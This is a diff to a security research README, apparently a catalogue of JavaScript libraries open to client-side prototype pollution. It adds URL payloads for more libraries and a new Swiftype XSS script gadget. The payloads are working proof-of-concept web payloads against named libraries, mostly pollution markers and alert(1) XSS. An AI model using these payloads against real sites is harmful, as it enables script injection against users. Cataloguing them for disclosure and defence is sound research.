@@ -10,16 +10,18 @@ In this repository, I am trying to collect examples of libraries that are vulner
 
 ## Prototype Pollution
 
-| Name                                                    | Payload                                                                  | Refs                                        | Found by                                         |
-|---------------------------------------------------------|--------------------------------------------------------------------------|---------------------------------------------|--------------------------------------------------|
-| Wistia Embedded Video (**Fixed**)                       | `?__proto__[test]=test`<br>`?__proto__.test=test`                        | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling) |
-| [jQuery query-object plugin](/pp/jquery-query-object.md)| `?__proto__[test]=test`<br>`#__proto__[test]=test`                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
-| [jQuery Sparkle](/pp/jquery-sparkle.md)                 | `?__proto__.test=test`                                                   |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
-| [V4Fire Core Library](/pp/v4fire-core.md)               | `?__proto__.test=test`<br>`?__proto__[test]=test`                        |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
-| [backbone-query-parameters](/pp/backbone-qp.md)         | `?__proto__.test=test`                                                   |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
-| [jQuery BBQ](/pp/jquery-bbq.md)                         | `?__proto__[test]=test`                                                  |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
-| [jquery-deparam](/pp/jquery-deparam.md)                 | `?__proto__[test]=test`                                                  |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
-| [MooTools More](/pp/mootools-more.md)                   | `?__proto__[test]=test`                                                  |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| Name                                                              | Payload                                                                  | Refs                                        | Found by                                         |
+|-------------------------------------------------------------------|--------------------------------------------------------------------------|---------------------------------------------|--------------------------------------------------|
+| Wistia Embedded Video (**Fixed**)                                 | `?__proto__[test]=test`<br>`?__proto__.test=test`                        | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling) |
+| [jQuery query-object plugin](/pp/jquery-query-object.md)          | `?__proto__[test]=test`<br>`#__proto__[test]=test`                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [jQuery Sparkle](/pp/jquery-sparkle.md)                           | `?__proto__.test=test`<br>`?constructor.prototype.test=test`             |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [V4Fire Core Library](/pp/v4fire-core.md)                         | `?__proto__.test=test`<br>`?__proto__[test]=test`                        |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [backbone-query-parameters](/pp/backbone-qp.md)                   | `?__proto__.test=test`<br>`?constructor.prototype.test=test`             | [[1]](https://bugcrowd.com/disclosures/57b28008-4653-4dec-88c3-4d38e40023ff/toolbox-teslamotors-com-html-injection-via-prototype-pollution-potential-xss) | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [jQuery BBQ](/pp/jquery-bbq.md)                                   | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [jquery-deparam](/pp/jquery-deparam.md)                           | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [MooTools More](/pp/mootools-more.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [Swiftype Site Search (**Fixed**)](/pp/swiftype-site-search.md)   | `#__proto__[test]=test`                                                  |                                             | [s1r1us](https://twitter.com/S1r1u5_)            |
+| [CanJS deparam](/pp/canjs-deparam.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [iamnoooob](https://twitter.com/iamnoooob)       |
 
 ## Script Gadgets
 
@@ -42,3 +44,4 @@ In this repository, I am trying to collect examples of libraries that are vulner
 | [Closure](/gadgets/closure.md)                          | `?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//`                              | XSS               | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
 | [Marionette.js / Backbone.js](/gadgets/marionette.md)   | `?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)`   | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
 | [Adobe Dynamic Tag Management](/gadgets/adobe-dtm.md)   | `?__proto__[src]=data:,alert(1)//`                                            | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
+| [Swiftype Site Search](/gadgets/swiftype-site-search.md)| `?__proto__[xxx]=alert(1)`                                                    | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
